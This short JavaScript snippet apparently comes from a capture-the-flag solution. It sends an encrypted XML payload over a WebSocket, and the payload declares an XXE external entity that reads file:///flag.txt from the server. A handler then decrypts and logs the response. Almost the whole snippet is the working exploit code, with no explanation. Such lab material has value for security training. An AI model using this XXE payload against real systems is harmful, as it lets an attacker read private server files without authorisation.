socket.onmessage = (event) => {
  if (event.data == 'connected') return;
  try {
    let data = JSON.parse(decrypt(JSON.parse(event.data).data)).data;
      console.log(decrypt(JSON.parse(event.data).data));
      document.querySelector("#finalPrice").value = data.price;
    } catch (error) {
        console.log(event);
    }
  
};

let data = JSON.stringify(encrypted({'format': 'xml', 'data': '<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt" >]><root><format>json</format><data><countries>&xxe;</countries><startdate/><enddate/><resttype>1</resttype><price/></data></root>'}));
socket.send(data);
